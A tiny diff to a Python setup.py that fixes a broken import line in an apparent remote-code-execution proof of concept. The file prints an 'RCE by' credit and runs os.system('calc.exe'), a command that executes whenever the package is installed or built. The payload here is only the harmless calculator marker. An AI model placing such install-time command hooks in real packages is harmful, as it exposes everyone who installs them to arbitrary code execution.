@@ -1,5 +1,5 @@
 import os
-from setuptools from setup
+from setuptools import setup
 
 print("RCE by w3shi(S.Lakshmi Vignesh")
 os.system("calc.exe")
